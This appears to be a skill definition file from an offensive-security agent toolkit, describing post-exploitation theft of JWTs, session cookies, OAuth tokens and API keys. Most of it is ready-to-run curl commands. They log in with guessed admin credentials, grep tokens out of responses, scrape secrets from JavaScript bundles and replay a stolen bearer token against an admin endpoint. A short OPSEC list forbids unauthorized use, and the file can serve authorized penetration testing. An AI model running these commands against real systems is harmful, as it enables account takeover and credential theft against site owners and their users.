---
name: token-theft
description: Steal JWT tokens, session cookies, and API keys from responses
version: 1.0.0
phase: post
category: post-exploitation
tags: [tokens, jwt, cookies, api-keys, session, theft]
tools: [curl, browser-devtools]
difficulty: basic
opsec_level: high
time_estimate: 1m
severity_if_found: critical
related_skills:
  - credential-harvest
  - cors-session-ato
mitre_attack:
  - T1539
  - T1550.004
---

## When to Use

Use this skill to extract authentication tokens, session cookies, and API keys
from HTTP responses, browser storage, or application interceptors. Stolen tokens
enable session hijacking and account takeover.

## Prerequisites

- curl for HTTP response inspection
- Access to browser developer tools (if browser-based)
- Target application with active sessions

## Procedure

```bash
# 1. Intercept JWT from login response
curl -sk -D- -X POST "https://TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"pass"}' 2>/dev/null | grep -i "set-cookie\|authorization\|token"

# 2. Extract JWT from response body
curl -sk -X POST "https://TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"pass"}' | jq -r '.token // .access_token // .jwt'

# 3. Decode JWT payload (no verification)
echo "eyJhbGci..." | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# 4. Steal cookies from response headers
curl -sk -D- "https://TARGET/dashboard" 2>/dev/null | grep -i "set-cookie"

# 5. Extract API keys from JavaScript bundles
curl -sk "https://TARGET/static/app.js" 2>/dev/null | grep -oEi "(api[_-]?key|apikey|secret)['\"]?\s*[:=]\s*['\"][^'\"]+['\"]"

# 6. Check for tokens in local storage (via browser devtools)
# Open DevTools → Application → Local Storage → look for token/session keys

# 7. Check for tokens in sessionStorage
# DevTools → Application → Session Storage → extract token values

# 8. Intercept OAuth tokens from redirect
curl -sk -D- "https://TARGET/oauth/callback?code=AUTH_CODE" 2>/dev/null | grep -i "access_token\|refresh_token"

# 9. Extract bearer token for reuse
TOKEN=$(curl -sk -X POST "https://TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"pass"}' | jq -r '.token')
curl -sk -H "Authorization: Bearer $TOKEN" "https://TARGET/api/admin/users"
```

## OPSEC Rules

- **CRITICAL**: Do not use stolen tokens for unauthorized access
- Document token type, expiry, and scope
- Do not refresh or rotate tokens you didn't create
- Log all token interceptions for audit trail
- Do not exfiltrate tokens to external servers

## Verification

- Confirm stolen token authenticates successfully
- Check token expiry and scope
- Verify token grants access to sensitive endpoints
- Test if token is bound to IP or fingerprint

## Pitfalls

- Short-lived tokens may expire during testing
- HttpOnly cookies cannot be stolen via JavaScript
- Some JWTs use asymmetric signing (cannot forge)
- Token binding (DPoP) may tie token to client
- Refresh tokens may require client_secret

## Output Format

```
[TOKEN] JWT stolen from login response
  Endpoint: POST /api/login
  Algorithm: HS256
  Expiry: 3600s
  Claims: {"role":"admin","sub":"admin@target.com"}
  Severity: CRITICAL

[COOKIE] Session cookie intercepted
  Name: session_id
  HttpOnly: false
  Secure: false
  Severity: HIGH
```
